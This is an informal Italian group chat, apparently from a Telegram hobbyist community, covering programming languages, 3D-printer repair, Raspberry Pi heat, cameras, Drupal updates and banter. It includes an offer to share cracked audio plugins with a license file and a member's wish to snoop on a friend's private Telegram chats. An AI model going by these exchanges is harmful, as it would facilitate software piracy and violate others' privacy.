 anche io lol
O vps con sopra Photoshop
non sono propriamente la stessa cosa
Ti pare una buona idea?
.
no


Che ne pensate come pla? Lo avete mai sentito? 
vuol dire spendere un bel po' in VPS per usarla con photoshop
Ma sbaglio o te ci giochi con il PC?
Come faresti su Linux?
Ah, dimenticavo, mai provato visual studio?
io uso arch tutti i giorni
apro windows  solo per giocarci generalmente
quind <3h a settimana
non programmo in C++ o in C# quindi no
Che bravo
Pure io 
Io non credo lo installerò più
male
Ehh
Io credo invece che al massimo proverò gentoo
L'ultima volta ho formattato il disco sbagliato
son tentato di passare a debian
Quello con Windows
Quindi adesso sono senza Windows
Passa a elementary
Convertiti
A chi?
sono un glorius gnome user
A Riccardo
lol ho appena scoperto di avere 1TB gratis su OneDrive
+
Ma ma ma ma ma ma
La Madonna
++
+++
++++
Oggi ho rotto php
Creando un'infinita pagina di errori
Ma il senso di questa frase?
Ho rotto php
ma perché usate il PHP, siete proprio sadici
+34
No è bellixximo
no
In realtà è utile
Si
Io sto studiando py
in realta' e' una tecnologia superata da tempo
No
Php è meglio
E che usi?
-
node.js
un esempio
ruby
flask e python
Anche no
Puoi utilizzare quello che vuoi

JavaScript o PHP secondo me
node.js === javascript
Ma no
Si, ho capito 
Ma sì
Quoto
why not
Ma no
Python??! Siam seri
Anche Golang
si python
Si
Serissimo
Lo sto studiando adesso
Lo so che si può fare
Però no
Dai
No
È una questione di principio
sai che buona parte delle cose di google sono fatte in python?
 aiutami pls
Puoi fare pure gli userbot in python
In realtà è largamente utilizzato per il Web Developing con Django
Non ricordarmelo pls
E un lavoro come Sviluppatore di App Django viene ben pagato
alla fine tutti gli sviluppatori full stack sono ben pagati
adesso pero' argomento, perche' non ti piace python?
Vero
perdonate per gli apostrofo al posto degli accenti ma ho una tastiera US
Tommy porco il Cristo non deludermi
Io ho risolto tramite il layout combinato
La sintassi
ti cambiano molto due punti al posto di una parentesi graffa?
Per i sviluppatori che vengono dal c il python è completamente contro intuitivo
Per me sono più comodi tbh
gli*
per me e' indifferente
Che vengono dalla maggior parte dei linguaggi di programmazione, penso
giusto thanks
Ti delego come anti - Django
Tilde + lettera é troppo comodo per gli accenti
Ma no dai. Mancano solo un po di cose "sporche"
 raccontagli il mio ritorno ai linguaggi c like
A livello di concetto siamo apposto, ma di sintassi siamo su due pianeti diversi
Ti direi che pesa quasi più il contrario
Beh a parere mio se conosci già bene i fondamenti della programmazione soprattutto quella ad oggetti tra c e python ciò che ostacola di più è la sintassi
Poi ovvio non sono un professionista quindi ciò che penso e pienamente relativo
*è
La bellezza della g board
Sì ma la sintassi è abbastanza facile da ricordare/cambiare. Invece ci sono altri cambiamenti che secondo me incidono su come scrivi il codice.
No fra
Quando sono ripassato dal python ai linguaggi c Like è stata una tragedia
te lo dico io che uso abitualmente la sintassi di python e quella dei C-like
Strutturalmente ho notato grosse differenze, poi dipende anche dai linguaggi c like che si usa, io mi trovo bene con il c# quando voglio fare qualche piccola esercitazione
Basta che lo strumento professionale sia staccare il bottone


Si, fighissimo – 35
 78%

Mmh preferisco il resto – 10
 22%

 45 people voted so far.
Sarà che uso c++ e python quotidianamente, la differenza di sintassi non la sento più
siamo in due
oddio non uso c++ ma js
Che ne pensi del JavaScript usato come linguaggio backend?
Kek
credo che per gli sviluppatori full-stack sia la cosa migliore del mondo
Ultimamente sembra molto di moda
Non ti consento dire che js è clike
Ecco
Più che altro npm certe volte fa desiderare
premetto di non averlo mai usato per il backend,  ma mi sembra una cagata
Che muoia?
è stronzo
beh
infatti è meglio yarn
Io non saprei, molti dicono che non è nato come linguaggio clientside e che è meglio che rimanga così, altri dicono che invece è ottimo come linguaggio serverside.
No. 
La cosa brutta di Node.js è che appena scarichi una libreria da npm ti ritrovi con una cartella che pesa 1GB e oltre 400 altre librerie di dipendenze....
Quando installi qualcosa con npm ti arriva lo tsunami di dipendenzr
Perchè non ti piace php?
Esatto
Mah, più lo uso più non mi piace
è vecchio e sorpassato
Non credo
Viva Java con le sue servlet bellissime e tomcat
e schifoso
Non dovete essere razzisti
E lo impari in mezza giornata

per alcune cose bisogna esserlo
su questo non posso darti torto
Spero tu stia scherzando
Ovvio
Ed è fucking rapido fare una pagina al volo

a ok
Volevo vedere chi si spaventava per primo
poi ovvio dipende da cosa bisogna fare
^ ho vinto allora
il vantaggio di php è che si configura in 30 secondi con qualsiasi webserver
parla quello che ha detto "Non ci capirete niente da questo video" 
esatto lel
Beh è vero che lo impari in mezza giornata
Poi ci metti tre mesi a capire perché non va
ah ecco, dettagli ovviamente
beh nel dubbio processing, lo  sto adorando ultimamente, ci fai un po' di tutto, è un po' un c++ con però la possibilità di visualizzare tutto molto semplicemente, poi per il resto ci assomiglia anche al cpp, non troppo, non c'è un main() ma setup() e draw() e poi la dichiarazione degli array è presa da java mi sembra, comunque è fatto bene...è una sbobba di linguaggi, una sbobba bellissima
E come al solito la cosa difficile è capire cosa fare... La sintassi dopo un po' diventa solo una seccatura se non la sai
playlist spotify che usate per concentrarvi nella programmazione?
Processing è java praticamente
solo io non ho assolutamente voglia di scaricarmi spotify o altre app e quindi streammo direttamente da iutub?
Rock/Metal
no, NO
Molto simile al java
no
io ho l'abbonamento
Comodo se arrivi da lì
Sotto sotto c'è java
te sei pazzo
una che mi sono creato io, o comunque il Daily Mix che è lo stesso personale .-.
madonna quanto flood 
non in ogni caxxo di dichiarazione almeno ù-ù
linka che se ricordo bene tu sei quello che vuole iniziare a produrre
Meh, io ascolto EDM in generale, in particolare mentre programmo KSHMR e Don Diablo, quindi il Relax personale potrebbe essere relativo
mmm, a dire vero è da più di un anno che produco 
ecco idem
è privata però, wait
beh si certo ma java per me è difficile e incomprensibile...processing è facile, voglio dire, sono tipo 3 giorni che provo a fare qualcosa con java di processing e sono già alle classi e faccio cose belle, 
 ._.
io ascolto un po' di tutto: dubstep, progressive ed electro house, rap italiano, capita anche che mi ascolti heavy metal
Why?
Altrimenti una cosa più calma che ascolto altre volte è l'album "Solar Echoes di Nigel Standfor" (qualche nome potrebbe essere sbagliato)
Anche Daft Punk ora che ci penso
thanks
 la collab con tutto il gruppo producer è nuovamente morta?
ah
Sì, perchè non riesco ad installare Nexus e Sylenth1
Chromecast
te li passo se vuoi


c'è un po' di roba che devo togliere, comunque in generale sono queste
thx
Se spulcio la selva oscura del mio Hard Disk ce li ho, ma non riesco ad installarli lo stesso
OOOOMMIODDDIO
STMPD RCRDS 
CLICCATE SULLA FOTO 
ovvio 
sylenth col pacchetto che ho io devi semplicemente far partire l'eseguibile e poi dal tuo DAW aprire sylenth e mettergli il license.dat
Manca Mike Williams - Feels Like Yesterday
la metto domani ❤️
E anche KSHMR - House Of Cards
Dove posso comprare monero?
N-n-n-n-n-n-not caving into you, not caving into you
Quando finalmente becchi l'invito per Dribbble e fai subito capire che sei una persona seria
Questa non la sapevo 
Va come gli Etherium
Su binance, vedi il video che abbiamo fatto con Than poco tempo fa sul trading
Eh ma qua abbiamo la pulizia kontattii

pulizia kontatty? 
c'è anche 
, pretty interessante
Anvedi Giulian, oh 

In che senso?

ragazzi sono l'unico a cui non funziona più il sito 
 ??
quando gli faccio compilare a lato non appare nulla ma penso che venga compresso tutto in pochi millimetri sotto perchè allungando e restringendo la scheda appaiono stringhe singole di codice tra cui 
 <keyboard> ecc.
rubyyyyy
a me funziona
aghh
asp ti mando una foto
avrai qualche bug con la risoluzione...usa ispeziona elemento e copia incolla no?
guarda in basso
si come dicevo io, un bug grafico, usa ispeziona elemento...oppure prova con altri browser e con finestre di diverse dimensioni, si bugga :/
thanks
ma soprattutto....chi caxxo fa la foto?
Ore 9:15, la situazione comincia già a degenerare
dettagli 
Il picco di 641....
vedi cicca sadico che scatta la foto
Ha una presa lan stranissima se riesco ti faccio una foto
La mia mano
🤔

Che ore sono
Ragazzi qualcuno qua da utilizzare il metodo del 
?
ma hahahahahah
Mannò, ho perso il mio flood ratio cambiando account ☹️
Same, è una rogna sul mio pc la suite adobe ma il suo lavoro lo fa bene purtroppo
Avendo windows che si fotte già 30% di cpu, ram e 80% del disco
Io userei il comic sans, dà un tocco di serietà in più
ma ma ma 
 
se lo fa bene allora va bene non ho capito
Ma che cazz?
Seguo
Cos'è?
Sicuro sia lan?
Magari è proprietario
?
Cosa cambia tra i motori con magneti allo statore e bobine al rotore e quelli con bobine allo statore e magneti al rotore?
Non quando per avviarlo devi arrestare esplora risorse altrimenti l'intero windows va in paging
È una porta proprietaria, ti serve l'adattatore
Grazie non sapevo come trovare l'adattatore senza il nome
Basta che cerchi Samsung LAN TV adapter e lo trovi
 ma fanno schifo i Lindor
Folle 
È cioccolata chimichissima
Io e mia mamma andiamo di una stecca a testa a sera
No, sa parecchio da orzo e da cose varie ma ci sta un botto
Eh abbiamo due concezioni di cioccolata diverse
Per me la cioccolata ce deve sapere di cioccolata fine ahaha
Io mangio solo fondente dal 60 al 90 per cento
Fondente 100%, amarissima? In realtà non mi dispiace ma dipende dalla situazione
Il 100% èr buonissima
Idem, dal 70 al 88 ma dell'ultima non ne vado pazzo
Secondo me quelle cioccolate lì vanno accompagnate con qualcosa
io al latte
Tipo un bel bicchiere
con un bicchierino di brandy...
Naah, il cioccolato al latte fa cacare
È troppo burroso, pastoso nah
va a gusti
è come dire .. bionda o mora
Il cioccolato è cioccolato, basta che stimoli dopamina e sei apposto 
Son donne, entrambi ❤️
eh lui è il nostro "King of Spam"  io sono tra i primi 10
No io quello al latte li balzo a piè pari
Dove sto io?
pensa al latte... bianca!

Nella top 15 *dub*
Qual'è il comando?
si vede che non hai mai provato la cioccolata di Modica
Invece sì
Rossa❤️
molto buona anche la cioccolata artigianale di Torino
I gianduiotti
...al latte!
allora sai di cosa parlo
 come si fa ad avere questa ?
Fatto la screen, arriva
Thx
Se inoltravo il messaggio veniva taggata mezza gente
Son 26esimo rip
E se usavo i congiuntivi il messaggio non aveva lo stesso sapore
Una volta era più in alto
2 
?
ok che ho gli occhiali, ma qui ci vuole Hubble per leggere 
e soprattutto adesso è tornata la corsa allo spam come con Combot
per fortuna è un comando solo per admin 
mi manca il buon vecchio Combot
GIMP NOW
Costa 85402549€ al mese di meno
questo mi fa venire in mente combofix, ve lo ricordate? ai tempi di xp appena uscito
ah perchè la suite Adobe si paga? 
Chi la ha mai pagata
XD
ahahahhahahah
amtliehmhemhm 
Il mio tentativo di Render "fotorealistico"
c4d 
Sentiti fortunato, io il massimo che so fare sono le render di mc 
Le facevo anche io lol
Me le facevo pagare :D
le sedie con il legno stirato male ci sta
O.O
menchia
che tosse
il muro con i blocchi sfalsati ci sta
XD
Ho scoperto solo oggi della funzione ripeti
cos'è questo obrobrio
Il mio masterpiece di design
ctrl+c ctrl+v
È quello che ho fatto rip
ehm.. wtf
Ragazzi scusate c'è un modo per sostemarlo
Ditemi di si 
è un monitor?
Si
magari (
) c'è un ricambio per il bus
Hai il modello? cerca su Amazon "monitor driver <modello>" e dovresti trovarlo
è rotto il bus .-.
non servono driver
AH ma tu intendi il driver fisico? 
io avevo capito quello software

sisi fisico hahahaha
 allora? Come sono le cuffie?
Lo ho sempre visti con magneti al rotore sinceramente
Uppp concordo
Ahaha notato anche io
Io ho vinto il premio più messaggi cancellTi
E 
 allora sicuramente il premio più messaggi modificati
Lol
Ore 9:15, la situazione comincia già a degenerare
I video POV, quelli belli...

Comunque quelle telecamere sono una cosa fottuta, hanno una stabilizzazione impossibile 
Puoi avere il parkinson e il video si vede comunque perfettamente stabile quasi a livello gimbal 
Comprati il Huawei p20 pro e addio tuttalaroba che hai per fare foto
Guarda... Non direi proprio
Uhm sì
La qualità della Canon è molto probabilmente superiore, ma non in maniera così evidente da giustificare il portarsi dietro 2068033403370 chili di roba
Che schifo Huawei
I chili sono quelli che stabilizzano bro 
Io preferisco il cioccolato al latte
Jacopo Carrara che ha preso la a7s ha preso un obiettivo in ottone solo per aver peso e stare stabile 
E Lindt è l'unica marca decente per il cioccolato
Forse anche perugina
Ma il baricentro dopo non si sposta troppo in avanti?
Guarda i video del p20 pro
Non si muove nulla
È spettacolare
Lì c'è il centro di massa
E finto. Elettronico. Jello. Scommetto non ha neanche il sensore stabilizzato meccanicamente  Ma ci sta, è un cell
Cioè, più che altro ha un sensore grande un'unghia
Anzi  meno
Come vlog camera ci sta, al posto di una rx100, ma non ci puoi fare videomaking serio
Al massimo è rumoroso la sers
Anche al posto di una gopro
Incredibilmente no, intelligenza artificiale elimina tutto
Elimina inventandosi dettagli?
Boh credo che davvero sia giunta l'ora per tutte le macchine fotografiche / videocamere di basso livello... Il tempo che questa tecnologia scenda di prezzo e avranno senso solo le macchine fotografiche costose
Vengono mangiate dalle cavallette queste libellule
No, utilizza i frame prima e dopo per ricostruire la scena
Suppongo che anche quelle nel frattempo si evolvano 
Bah
Non lo stanno facendo
E non sembra che ci sia interesse a farlo
Soprattutto perché le persone che comprano una compatta da 300 euro lo fanno perché vogliono fare foto più belle che con il telefono... Se già il telefono fa foto stupende non ha senso spendere altri soldi
"Hey signor Kodak, perché non entriamo nel mondo del digitale?"
"nah, la pellicola funziona così bene..."
Esatto. La stessa cosa che succederà con le mirrorless
Hey signora nikon, perché non facciamo delle mirrorless decenti?
Batteria, zoom ottico, vite per tripod, controlli manuali invece che touch, nessuna notifica che rompe le palle, nessuno stalking di Facebook...
Zoom ottico: presente
Vite per tripod: lo metti lo stesso su un treppiedi, non serve la vite
Controlli manuali: l'acquirente medio di una compatta non se ne fa nulla e anche le compatte hanno quasi tutto touch ormai
Si zoom ottico fino a na certa 
Anche le compatte hanno zoom ottico fino a una certa
Boh vedo la lumix di mio fratello che zooma più della macchina di arcobaitrr
Digitale
Nono è una bestia
Non fidarti. Huawei ha già fatto scherzi del genere. Qualche anno fa mise una foto (magnifica) su Google+ dicendo che era stata scattata con il top di gamma del momento. Il problema é che Google+ permette di vedere un sacco di informazioni sulla foto caricata e infine é saltato fuori che era stata scattata con una Canon.
Ottime
Ragazzi
Una domanda
Sarà tipo 500mm ottici guarda 
Qual'è l'obbiettivo con zoom più elevato per la Nikon d3100?
Nono figurati se mi fido di Huawei!
Ho letto un po' di test di gente che ha provato il telefono e visto un po' di foto tipo Galeazzi e persone come lui
Chinesemania
Il telescopio
Wtf
Non hai idea

Seriamente, qual'è?
Quoto
Le copertine quelle belle ahahah
Comunque oggi la metro ha deciso di non leggere il mio biglietto Madonna.
Beh  un 600mm sicuro
Seriamente il telescopio, l'adattatore non costa nulla... Sennò trovi i 600mm da safari
Passa dal buco
Ne compro un altro
Wwhhaat
Fai il trenino
AHAHAHAHAHAHAH
A Roma lo fanno tutti
Anche con me
A me mai successo
Voglio vedere quanto rende quella macchina con un obiettivo da 5000€
Ma che domanda è... A cosa ti serve saperlo? Probabilmente con un duplicatore con un 600mm fai le foto a 5km
Figo
Quanto costa un 600m?
Quanto una automobile
E la Canon è migliore in quella fascia
Anche di più 
Dipende dalla macchina però in effetti
Sì vabbè
ma i canon sono migliori è 
Ci compro 1/2 Pandini
tanto con una d3100 fanno schifo le foto in un'ottica del genere :D
ma poi che cavalletto serve per una cosa del genere XD
Un paio secondo me 
giusto corona ha ottiche cosi hahahah
Handheld
quando vuoi un telescopio ma non ne hai i soldi
Però puoi fare foto così senza morirci
Nono costa ben di più perché ha lenti di altissima qualità che non fanno aberrazioni... Un telescopio newtoniano a specchi ti costa 1/100 a parità di focale
Soprattutto perché ti è rimasto solo un rene
AHAHAHA
Con quanto odio "piastra di metallo spazzolato"
A quanto pare li hanno cambiati, adesso c'è questa piastra di metallo spazzolato
boh preferivo il caro vecchio legno e vetro a sfondo nero
È bruttino effettivamente 
A me piace di più
Di sicuro salterà subito all'occhio nell'armadio, tra arduini e cosevarie
Bomboletta e dipingilo di nero
Ce la farò per domani alle 13:00?
siiii
Quelli in dc con le spazzole hanno le bobine al rotore..
io solo al latte
Poraccio
non mi piace fondente 
Ma rosica in fondo alla gola
ma che ca
Comprare su eBay, aspettare 6 mesi per un pacco e riceverlo quando ti hanno rimborsato è una delle gioie più belle del mondo
io avevo comprato su amazon un adatatore otg/mhl e visto che non era arrivato me ne hanno mandato un'altro. E poi mi sono arrivati entrambi
Mmmm forse me ne hanno rinviato un altro nel mentre🤔🤔🤔
Sarebbe assurdo
Solo io vedo questo?
Cosa sono i cali improvvisi?
Le pulizie contatti
È da regolamento 
Pulizie kontatti falzi
Cioè quelli che non scrivono?
Yes
Quelli che non scrivono nulla per 4 mesi
Comunque chissà come fanno a fare questa rappresentazione dati
Oks grazie
La Mano della Giustizia è peggio di facebook
AHAHAHAHAHAHA
Pff
Omg sono tredicesimo
Oggi sono fisico
Anche Giulian
Schifo
Meglio in forma differenziale
Ma :c
È la maglietta del liceo xD
Roberto ti disprezza
io primo :)
Ma oggi non era il giorno del contrario? :D
a...sono primo....mmhhh......
a ora capisco, sono il numero di messaggi inviati, non l'avevo letto
beh dai, 19k, road to 20k
Dove l’hai presa?
La mia scuola le ha fatte per il piday
ù-ù
Le magliette della mia scuola fanno pena
Mi spiace
Ciao ragazzi, domanda molto veloce, qualcuno ha mai acquistato qualcosa da Amazon Warehouse Deals? Volevo provare ad acquistare un drone (bebop 2), e dato che stava a circa 200€ in meno, la descrizione diceva che era in ottime condizioni e tutto, ma volevo una conferma da qualcuno che ci ha acquistato, qualcuno lo ha fatto?
"E Lindt è l'unica marca decente "commerciale" per il cioccolato"..idem Perugina..e aggiungerei Venchi
basta guardare il ritorno delle istantanee Kodak-Fujifilm-Instax 
Quello perché sono doventate una moda delle teeneger
Salto del tornello
le usano tantissimo i fotografi per gli album matrimoniali  oltre alle foto classiche s'intende
quanto riconosco quest'interfaccia
 
 leggi qua
  look
HAHAHAHAHAHAHAHAHAHAHA
Che li utilizzino non vuol dire che non siano una cavolata giusto per fare scena
ma no hanno il loro settore  il fatto di avere la stampa pronta, anche se con scarsa qualità, può avere il suo perchè..prendi per esempio HumanSafari, lui usa moltissimo le Instax e le Fuji, e fa degli scatti spettacolari con quelle macchinette
Vero, ma la trovi raramente
soprattutto perchè se togli il vetro ci puoi mettere i LED rgb dentro 
eh lo so purtroppo però al livello di cioccolate "serie" da supermercato io vado sempre su queste 3 e Pernigotti..la serie Nero di Perugina è fantastica
Cma humansafari fa dei bei vlog ma come fotografo lo boccio
Si esatto
Concordo
vabbè, calcola che in video fa vedere solamente il lato "commerciale"..io ho visto di persona dei suoi lavori a Bergamo, quando ha fatto il fotografo a manifestazioni e inaugurazioni, e merita davvero..è parecchio bravo
Uhmm noi dovremmo essere a posto però... ti ricordi che usciva la notifica "Aggiorna a Drupal 8 urgentemente per mantenere sicuro il tuo sito"? Ecco, abbiamo aggiornato
🤔speriamo..un controllino lo farei però
si infatti
lascio chimica valà, faccio un salto
Infatti 
 è ancora vulnerabile
Aggiornate subito
Sto guardando io adesso
Controlla anche gli accessi perché sicuramente qualcuno è già entrato
 un prodotto non può essere sia centrifuga che estrattore di succo  uno usa le lame e l'altro pressa
Hihi
ti stronco ❤️
Grazie teso 
Dillo a chi scrive i titoli su Amazon 
leggi sul gruppo blog prima di leggere i 1846 messaggi qui 
Ora scrivo ad Amazon xD
Sisi aggiorniamo spesso
Il vostro sito è ancora vulnerabile
non per molto ☺️
tranquillo, c'è già 
 in agguato
Speriamo, aggiornate subito che è pericoloso
sisi stiamo facendo

idk
abs is the way
no dico come pla comè?
^
mai usato il pla, 
sattoh
è così che mi ricordo il comando io
Avoglia
Mettiti sotto
 in down?
yep
al momento almeno🤔
Come mai?
Manutenzione
Aggiornamento Drupal

Il nuovo Raspberry pi 3 b+ è fighissimo
Yup, qualche minuto e torniamo online (sI spera)
Ok ottimo
Di solito ste cose le faccio di notte verso le duemmezzatre 
Hai un updater sulla VPS con uno Scheduler?
Eh no ste cose qui le faccio a mano
Aggiornare drupal intendo
Ma non è ripetitive
Perché devi premere i pulsanti in giro
Ciao, cambiare il font è sicuro?
in che senso scusa
non si dice down, si dice diversamente online
LuL
i file epub come posso aprirli da mobile?
Con un epub reader
ok, grazie
Caso mai oltre al font mi cambiano altro e mettono virus
Ti entrano i lohacker
A allora la sono problemi
Hahahahhahahahaha
Che batteria mi consigliate per drone intendo le celle 3-4?
Stiamo sistemando i casini con la sicurezza di Drupal
HAHAHAHAHAHAHAHA
ma cosa

hai distrutto la barriera della mania con questo
ahahahahahahahahaha 
 se devo stampare dei gettoni in plastica, per risparmiare pla e fare più veloce l'infill a quanto devo metterlo?
IO
ODIO IL PLAAAAA
quindi non chiedere a me, abs is the wae
ok
 l'infill comunque a quanto lo metto per stampare gettoni?
che sia abs o pla
non..non lo so, dipende dal materiale e dalle sue proprietà, non so quanto sia solido il pla, di solito è poco solido quindi mettici un infill alto
il 25%?
asp....vuoi stampare i gettoni per gli autoscontri, di la verità!

anche un 30
ok grz
rispondi marrano
si
non solo per quelli
dammi il progetto
Non so se ti convenga
why?
Raga quanti volt si possono dare minimo e max al pin VIN di Arduino?
è una semplice monetina da 50 cent il gettone devo ancora disegnarlo per bene
Il costo del materiale, l' energia utilizzata e il tempo che ci mette a stampare
beh contando che ne stampi un piatto intero per volta consumerai in totale (filo + energia) tipo 1 o 2 euro massimo....ne hai stampati almeno 7/8
voglio dire...al massimo ci attacchi il filo e li ritiri su poi

raga se si graffia leggermente il piatto di stampa succede qualcosa?  
hahaha, il mio ha le voragini ._.
foto
voglio fotooooo
mo' è tutto sporco di abs juice non si vede
e non lo voglio pulire
Come lo collego un jack ai fili di un altoparlante?
USATE UN CMS?
e io che pensavo aveste fatto tutto a mano 
l'unica cosa che so è che il cavetto in rame dovrebbe essere la schermatura e va a gnd 
Già è un passo avanti ahahahah
i cavi importanti dovrebbero essere rosso e nero che portano il segnale, gli altri 2 non so esattamente per cosa stiano, comunque è perchè hai un jack con più robba, beh rosso e nero sono gli importanti in teoria comunque, gli altri 2 boh
Dovrebbero essere uno il GND e uno il microfono
ecco, si, probabile
quindi il verde è microfono e il rame è gnd
Per collegare due casse devo metterle in serie o in parallelo?
Esattamente!
ma sei pazzo 
E niente raga, non credevo sarebbe successo... E invece sono tornato a programmare in Java
I plugin Bukkit di Minecraft 
 urgente
 come si smonta questo pezzo
mi si è intasato l'estrusore
c'è una vite
poi tiri
dove non ne vedo
l'ugello si cava
sull'hot end c'è una vite, piccolina e nera
l'ho cacciata e si è tolta resistenza e sensore temperatura
non riesco a togliere ugello
tira, usa una pinza, l'ugello si sfila, ci vuole solo un po' di forza
infondo è incastrato per tutta la lunghezza dell'hot end :/
nessun risultato
non si tira proprio
fra poco arriva il video
eeee credo che sia un peeeelo incastrato ._.
prova ad accendere un fornello e passarcelo sopra un po', magari si stasa
ok grz
va tolto a caldoooo
questa roba si svita e si avvita solo a 200 gradi!!!!!!!!!!!!
così ti resta in mano.... lo spezzi
Usa un ago
no vabb, è bello duro come coso...infondo è ottone, resiste, solo che a caldo va meglio ecco
LOL
chi la riconosce ha la mia stima
*no vabb, è bello duro come coso...in fondo è ottone, resiste, solo che a caldo va meglio ecco
cos
Sono un progetto di intelligenza artificiale con lo scopo di correggere i messaggi grammaticalmente scorretti
k
Adesso sono un umano che scrive :D
k
Secondo voi è meglio il DOOGEE MIX 2 o il DOOGEE BL12000 PRO ?
Ma rasp in che caso viene danneggiato?
Cioé che operazioni scaldano troppo?
Se desideri lasciare un feedback, puoi utilizzare il comando >feedback seguito dal messaggio
accenderlo per esempio
poi basta, è difficile fargli del male ._.
Si ma si accende una volta sola
Sono accoppiati fatti per essere in tolleranza a caldo, a freddo i diversi coefficienti di espansione fanno sì che sia bloccato, aprirlo a freddo vuol dire o romperlo o danneggiare il filetto e di conseguenza la tenuta in esercizio
Più ram usa più scalda?
Quanti anni ai?
Funziona eh
Più processore usa, più scalda
non credo....non centra più che tanto...è più viene usato il processore semmai e per usarlo beh devi star facendo una qualche operazione, tipo aggiornamenti e cose così...ma tanto anche a 120° fa il suo lavoro perfettamente quindi ù-ù
*Quanti anni hai?
Comunque ne ho 17
Astritaschi la nascala
Gestire un server in java?
intelligenza artificiale o 90000 righe di if()
Io ne o 14
Ora lo puoi proprio buttare
Intelligenza artificiale, deep learning
stavo per dirlo
If 
una cosa è scaldare e un'altra è sciogliere
ho i ricambi
?
Dipende da che server
Cioé?
50 persone penso che lo regga
100 penso che soffra non poco
Server in Java è generico
Dipende da che server è lol
Penso si riferisca a MineCraft
No
mah...probabilmente il processore deciderebbe di volontà propria la strada migliore, il suicidio, proprio perchè si tratta di java, per il resto credo che starebbe sui 70°
Non si brucia?
Ma si sblocca direttamente da montato non c'è bisogno di fare questi lavori
 devo buttare anche il pezzo grosso dove si inserisce la resistenza con il sensore?
Poi se sta a 70 gradi ho paura per quello che gli sta attorno non per lui
Mettigli un dissipatore
fidati che prima di bruciarsi il rasp si fonde la cpu, e per arrivare a 190° ci vuole una laurea in sterminio di computer

Nom lo ho
Compralo, costano 3 euro
Ho paura per che é attorno
no, NO, dopo che ne ho messo uno io la temperatura è aumentata di 10-15°
Hai un tavolo che fonde a 70 gradi?
dissipatori passivi futili
lol, prova con quelli a ventola
il problema è trovare un modo di alimentare una ventola da 12v con il rasp ._.
dai gpio si intende
scs se ti rompo ma sei l'unico con la anet
Ma sei riuscito a disaccoppiare quei pezzi?
no
a 70° non credo che farai mai del male a nulla e poi la cpu sta al centro del rasp, devi proprio appoggiarci sopra qualcosa perchè a 2 mm dalla cpu già è freddo
Ce ne sono alcune USB mi sa
nooope, c'è un po' di gente che la ha qua
si ma non ne voglio comprare, sono tirchio
E fino a quando non li rimuovi  come fai.... Ma questi pezzi si staccando scaldando direttamente con la cartuccia
E se invece controllassi la temperatura ed interrompo il server finché non scende?
Puoi farlo
Ma non ha senso stopparlo perché arriva a 70 gradi
direttamente con la cartuccia???
Dovevi semplicemente lasciare resistenza e termistore, impostare 200 gradi e poi in temperatura con le pinze svitare
E che faccio?
asp che ci provo
Ma non hai bruciato la plastica interna così? Per me puzzava di morto
Niente, lo lasci così a 70 gradi
Non esplode
si beh sul fornello la plastica è diventata vapore ormai tutta mi sa
E come lo raffreddo?
progressi
va che anche a 170° ti bruci toccando la cpu ma a 2 mm affianco è freddo, fidati che finchè non ci appoggi volontariamente nulla sopra non succede nulla...

Non va oltre, lascialo così che va bene
ho svitato tutto
Ma C'è proprio un tubo in PTFE dove passa il filo no?
Io ci hosto un sacco di roba d non va mai oltre i 70 gradi
questo pezzo devo buttarlo pure?
quei due li ho buttati
Ma non devi buttare proprio nulla
o porc, e chi se lo ricorda quello, vero
Ma che è successo🤷‍♂
lo avete detto prima che era da buttare
Era un eufemismo, hai sicuramente bruciato il tubo ma bastava rimuoverlo e cambiarlo
che tubo?
sta eseguendo suicidi assistiti multipli all'estrusore della stampante
nulla di che
Dentro la vite forata cosa c'è ora?
niente
anzi del pla bloccato
Il nulla cosmico
ancora
E rimuovilo tutto ma lo hai di ricambio?
si
non ho il ricambio di questo asp
Ma se si blocca l'estrusore non importa buttare tutg
Sei su ignuranzaaa
Non devi buttare niente se non è rotto
ok
Comunque davvero ti hanno messo su ignuqualcosa
fede ma il motore può aver subito danni mentre non riusciva a far estrudere il filo?
No
Per un f450 va bene 2200mha o la 4000?
Ma probabilmente non dovevi nemmeno buttare l'ugello e il tubo sopra... Dopo la scaldata il tubo magari andava cambiato, ma dell'ugello non importava🧐
vabbe
nuovo
OverVolt chiude?
Avevo letto un "OverVolt Chiude" 🤔
anchio
Eh
Anch’io
È 
 che fa gli scherzoni
lol
Lel
Lo sguardo da monello
come li rimuovo dal piatto? non si tolgono
Invece di leggere la ruota del tempo... Hai tempo fino a domani
 la prossima volta scrivilo più credibile 
Lol
AHAHAH
Si hai ragione
Domani durante il pranzo di Pasqua
❤️
E soprattutto quando marco non guarda
"è tornata una mail da youtube"
Marco non stava guardando e gliel'ho fatto vedere io
tipo scrivi 2/3 messaggi così é più preoccupante 
Poi era troppo cattiva come cosa
  
vai vai, colpisci appena si distrae
Ma telegram in Veneto quanto Figo è?
HA MESSO LA PASSWORD A TELEGRAM
dio mio che cattiveria

cos? adesso o da sempre? 
figurete mi ha stesissimo

AHAHAHAHAAHAHAHAHAHAHAHAHA
Nooooo ora non posso spiargli le chat 
Stessa roba io
HAHAHAHAAHHAHA è maniaco
Aahhaha
Telegram Desktop 
Volevo vedere le tipe con cui si scrive 
Error: Null Pointer Exception
nonono ma come hai fatto dimmelo
Ti scrivo in privato ☺️
AHAHAHAHAAHAHHAHAHAGAGAGAGAGAGAGAGAHAHAHAHAHAH
così brutale
eh ma si scrive con Scont
in
 lui
LOL
povero bot
Kek



Ce li lasci
tolti
nooo hai rotto la catena di pedomoon
abbiamo creato una catena
()

Pray for Giorgio
Tutti a protestare affinché mi rimetta mod
Raga,a che ci serve  il bot security( 
) se abbiamo la grande mano?
ma non serve, sei già admin 🤔
è un aiutante della mano, quando ci sono tantissimi ban da fare in poco tempo la mano non ce la fa da sola
ssshhh
Io che pensavo che la mano è  OP lo ho sovravalutato allora?
Ma non possiamo bannare credo
ah vero, ci aveva rimosso da gestori, non da mod
._.
Lo lascio mod ma non admin 
rip
Se ne è accorto
raga non mi funziona pip3
Ma sono ancora helper
Ecco
in pratica ti fidi più di me che ci siamo visti una volta solo nella vita reale che non di tuo cugino 
Ovvio
🤷‍♂
Ma cosa cambia fra admin moderatore e gestore?
Admin ha potere sulla mano, mod ha poteri derivanti dalla mano
^^^
e gestore elimina i messaggi
il gestore è tipo tecnico della scuola, admin è tipo il sysadmin, mod sono tipo quelli che a scuola servirebbero realmente
Ma che caz
mi disp
ù-ù
è installato? 
Suda aptgetta
Ah okay e helper non serve a nulla
sattoh
Cioè mi puoi cancellare i messaggi? Falso se lo fai u.u
sudo apt-get install python-pip ?
l'helper è tipo il prof di storia dell'arte che apre la porta per far passare il wifi meglio
Manca un 3 da qualche parte
Ti aiuto io
ok
funzia
